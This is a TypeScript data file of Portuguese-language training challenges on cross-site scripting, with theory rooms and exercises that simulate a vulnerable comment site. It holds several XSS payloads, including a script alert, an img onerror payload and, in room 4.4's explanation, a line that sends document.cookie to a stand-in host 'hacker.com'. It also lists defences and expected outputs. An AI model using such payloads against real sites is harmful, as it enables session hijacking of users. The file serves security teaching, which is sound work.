import type { Challenge, CodeChallenge, TheoryChallenge } from '@/types/challenge';

const theory4_0: TheoryChallenge = {
  id: '4.0',
  type: 'theory',
  episode: 4,
  room: '4.0',
  title: 'Episódio 4 — XSS (Cross-Site Scripting)',
  description: 'Uma das vulnerabilidades mais comuns da web. Sites que não protegem inputs podem ser explorados.',
  content: `
**O que é XSS?**
XSS acontece quando um site aceita código malicioso de um usuário e executa no navegador de outras pessoas.

**Exemplo simples:**
Um fórum permite comentários. Você escreve:
\`<script>alert('Hackeado!')</script>\`

Se o site não proteger, TODOS que virem seu comentário vão ver o alert!

**Por que é perigoso?**
• Roubar cookies (sessões de login)
• Redirecionar para sites falsos
• Roubar senhas digitadas
• Modificar a página

**No mundo real:**
Facebook, Twitter, YouTube já tiveram vulnerabilidades XSS.

Vamos aprender a identificar e explorar (eticamente)!
  `,
};

const code4_1: CodeChallenge = {
  id: '4.1',
  type: 'code',
  episode: 4,
  room: '4.1',
  title: 'Simulando um site vulnerável',
  description: 'Este código simula um site que aceita comentários SEM proteção. Veja como um comentário normal é exibido.',
  instructions: 'Execute e veja o comentário sendo processado',
  languages: ['javascript'],
  starterCode: {
    javascript: `// Simulação de um site de comentários vulnerável

const comentarioDoUsuario = "Ótimo artigo!";

// Site coloca o comentário direto na página (VULNERÁVEL!)
const htmlGerado = "<div>" + comentarioDoUsuario + "</div>";

console.log("HTML gerado:");
console.log(htmlGerado);
`,
  },
  expectedOutput: 'HTML gerado:\n<div>Ótimo artigo!</div>',
  explanation: `
**O que aconteceu:**
O site pegou seu comentário e colocou direto no HTML.
Comentário normal = sem problema.

Mas e se o comentário for código JavaScript? 🤔
  `,
  hints: [
    'Este é um exemplo normal - apenas texto',
    'Na próxima sala vamos tentar algo diferente...',
  ],
  difficulty: 'easy',
};

const code4_2: CodeChallenge = {
  id: '4.2',
  type: 'code',
  episode: 4,
  room: '4.2',
  title: 'Seu primeiro ataque XSS',
  description: 'Agora mude o comentário para incluir uma tag <script>. Veja como o site vulnerável aceita código!',
  instructions: 'Mude o comentário para: <script>alert("XSS")</script>',
  languages: ['javascript'],
  starterCode: {
    javascript: `// Insira um comentário MALICIOSO contendo código JavaScript
// O payload XSS deve ser: <script>alert("XSS")</script>
const comentarioDoUsuario = "";

// Monte o HTML como um site vulnerável faria:
// Coloque o comentário dentro de tags <div>: "<div>" + comentario + "</div>"
// Imprima "HTML gerado:" na primeira linha
// Imprima o HTML gerado na segunda linha
`,
  },
  expectedOutput: 'HTML gerado:\n<div><script>alert("XSS")</script></div>',
  explanation: `
**VULNERABILIDADE DETECTADA!**

O site aceitou código JavaScript dentro do comentário.
No navegador real, isso executaria o alert.

**Impacto real:**
Se isso fosse um site real, você poderia:
• Roubar cookies com \`document.cookie\`
• Redirecionar com \`window.location\`
• Capturar tudo que o usuário digita

**Como proteger:**
Escapar caracteres especiais (<, >, &, ", ')
Usar bibliotecas de sanitização
Content Security Policy (CSP)
  `,
  hints: [
    'Mude o comentário para: <script>alert("XSS")</script>',
    'Use concatenação: "<div>" + comentarioDoUsuario + "</div>"',
    'Use console.log() para imprimir cada linha',
  ],
  difficulty: 'easy',
};

const theory4_3: TheoryChallenge = {
  id: '4.3',
  type: 'theory',
  episode: 4,
  room: '4.3',
  title: 'Tipos de XSS',
  description: 'XSS tem 3 tipos principais. Vamos entender cada um.',
  content: `
**1. Reflected XSS (Refletido):**
O código malicioso vem na URL.
Exemplo: \`site.com/busca?q=<script>...</script>\`
Vítima clica no link → código executa

**2. Stored XSS (Armazenado):**
O código é guardado no banco de dados.
Exemplo: comentário com XSS
TODAS as pessoas que virem o comentário são afetadas

**3. DOM-based XSS:**
JavaScript da própria página modifica o DOM de forma insegura.
Mais técnico - exploração avançada.

**Qual é pior?**
Stored XSS = mais perigoso (afeta muitas pessoas)
Reflected XSS = atinge uma pessoa por vez

**Próxima sala:** Você vai criar um payload XSS mais realista.
  `,
};

const code4_4: CodeChallenge = {
  id: '4.4',
  type: 'code',
  episode: 4,
  room: '4.4',
  title: 'Roubando cookies (simulado)',
  description: 'Em um ataque real, hackers roubam cookies para sequestrar sessões. Vamos simular isso de forma educacional.',
  instructions: 'Complete o payload XSS para "roubar" o cookie',
  languages: ['javascript'],
  starterCode: {
    javascript: `// Simulação de cookie de sessão
const cookieSimulado = "sessionId=abc123xyz";

// Crie um payload XSS usando a tag <img> com evento onerror:
// "<img src='x' onerror='console.log(\"Cookie roubado: ...\")'>""
// A imagem com src='x' vai falhar, executando o código no onerror

// Imprima "Payload injetado:" e o payload na próxima linha

// Simule o resultado do ataque:
// Imprima "Cookie roubado: " + cookieSimulado
`,
  },
  expectedOutput: 'Cookie roubado: sessionId=abc123xyz',
  explanation: `
**O que você fez:**
Criou um payload XSS usando \`<img onerror>\`.
Quando a imagem falha, o código JavaScript executa.

**No mundo real:**
O cookie seria enviado para um servidor do hacker:
\`<img src=x onerror='fetch("http://hacker.com?c=" + document.cookie)'>\`

**Defesa:**
• HttpOnly cookies (JavaScript não acessa)
• Secure flag (só HTTPS)
• SameSite attribute

**Carreira:**
Bug bounty hunters ganham milhares de dólares encontrando XSS em sites famosos!
  `,
  hints: [
    'O payload usa <img> com src inválido para disparar onerror',
    'No final, o importante é imprimir "Cookie roubado: " + cookieSimulado',
    'Concatene strings para montar o payload e o resultado',
  ],
  difficulty: 'easy',
};

const theory4_5: TheoryChallenge = {
  id: '4.5',
  type: 'theory',
  episode: 4,
  room: '4.5',
  title: 'Episódio 4 completo!',
  description: 'Você agora entende uma das vulnerabilidades web mais exploradas.',
  content: `
**Conhecimentos adquiridos:**
✅ XSS (Cross-Site Scripting)
✅ Reflected vs Stored XSS
✅ Payloads e exploração
✅ Como sites devem se proteger

**Aplicações profissionais:**
• **Bug Bounty Hunter:** Encontra XSS, ganha recompensas
• **Pentester Web:** Testa aplicações web
• **Security Developer:** Implementa proteções

**Ferramentas profissionais:**
• Burp Suite (intercepta e modifica requisições)
• XSS Hunter (detecta blind XSS)
• OWASP ZAP (scanner automático)

**Próximo episódio:**
SQL Injection - ainda mais perigoso que XSS!

Continue evoluindo! 💉
  `,
};

export const episode4Challenges: Challenge[] = [
  theory4_0,
  code4_1,
  code4_2,
  theory4_3,
  code4_4,
  theory4_5,
];
